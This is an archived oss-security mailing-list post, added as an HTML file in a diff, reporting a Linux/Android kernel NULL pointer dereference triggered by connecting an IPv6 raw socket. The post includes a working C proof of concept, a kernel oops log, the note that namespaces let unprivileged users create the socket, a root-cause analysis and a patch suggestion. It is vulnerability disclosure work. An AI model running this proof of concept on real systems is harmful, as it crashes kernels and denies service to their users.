@@ -1,0 +1,211 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Re: CVE request - Android kernel - IPv6 connect cause
+ a denial of service</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="4">[&lt;prev]</a> <a href="6">[next&gt;]</a> <a href="4">[&lt;thread-prev]</a> <a href="../../../2015/12/11/5">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;CAP145pjaoc+Cn=E-AtTW2kZmBhouJPrKxjcqP+B6HT8HFbjjNg&#64;mail.gmail.com&gt;
+Date: Wed, 9 Dec 2015 16:37:26 +0100
+From: Robert Święcki &lt;robert&#64;...ecki.net&gt;
+To: oss-security&#64;...ts.openwall.com
+Subject: Re: CVE request - Android kernel - IPv6 connect cause
+ a denial of service
+
+This also works under modern Linux kernels - and the SOCK_RAW socket can be
+created with namespaces.
+
+$ ~/src/nsjail/nsjail -Mo --user 0 --group 0 --keep_caps --chroot / --
+/bin/sh -i
+sh-4.3# /home/test/a
+
+[  513.294978] BUG: unable to handle kernel NULL pointer dereference at
+      (null)
+[  513.294990] IP: [&lt;          (null)&gt;]           (null)
+[  513.294995] PGD 70579e067 PUD 70e0f7067 PMD 0
+[  513.295001] Oops: 0010 [#2] SMP
+
+Tested with:
+
+$ uname -a
+Linux ABC 4.2.0-18-generic #22~14.04.1-Ubuntu SMP Fri Nov 6 22:20:11 UTC
+2015 x86_64 x86_64 x86_64 GNU/Linux
+
+
+2015-12-09 11:15 GMT+01:00 郭永刚 &lt;guoyonggang&#64;....cn&gt;:
+
+&gt;
+&gt; POC:
+&gt; #include &lt;linux/types.h&gt;
+&gt; #include &lt;stdlib.h&gt;
+&gt; #include &lt;stdio.h&gt;
+&gt; #include &lt;sys/stat.h&gt;
+&gt; #include &lt;fcntl.h&gt;
+&gt; #include &lt;errno.h&gt;
+&gt; #include &lt;pthread.h&gt;
+&gt; #include &lt;sys/socket.h&gt;
+&gt; #include &lt;sys/un.h&gt;
+&gt; #include &lt;netinet/in.h&gt;
+&gt; int main(void){
+&gt;
+&gt;          int socket_fd;
+&gt;          struct sockaddr_in addr;
+&gt;          addr.sin_port = 0;
+&gt;          addr.sin_addr.s_addr = INADDR_ANY;
+&gt;          addr.sin_family = 10;
+&gt;
+&gt;          socket_fd = socket(10,3,0x40000000);
+&gt;          connect(socket_fd , &amp;addr,16);
+&gt;
+&gt;          return 0;
+&gt;
+&gt; }
+&gt;
+&gt; Analysis of causes:
+&gt; In the file net/ipv4/af_inet.c , It will cause pc is 0x0  , if the
+&gt; sk-&gt;sk_prot-&gt;get_port is NULL.
+&gt; static int inet_autobind(struct sock *sk)
+&gt; {
+&gt;          struct inet_sock *inet;
+&gt;          /* We may need to bind the socket. */
+&gt;          lock_sock(sk);
+&gt;          inet = inet_sk(sk);
+&gt;          if (!inet-&gt;inet_num) {
+&gt;                    if (sk-&gt;sk_prot-&gt;get_port(sk, 0)) {
+&gt;                             release_sock(sk);
+&gt;                             return -EAGAIN;
+&gt;                    }
+&gt;                    inet-&gt;inet_sport = htons(inet-&gt;inet_num);
+&gt;          }
+&gt;          release_sock(sk);
+&gt;          return 0;
+&gt; }
+&gt;
+&gt; Solution:
+&gt;
+&gt;          Add check as follow:
+&gt;                   if (sk-&gt;sk_prot-&gt;get_port &amp;&amp;sk-&gt;sk_prot-&gt;get_port(sk,
+&gt; 0)) {
+&gt;                             release_sock(sk);
+&gt;                             return -EAGAIN;
+&gt;                    }
+&gt;
+&gt;
+
+
+-- 
+Robert Święcki
+
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
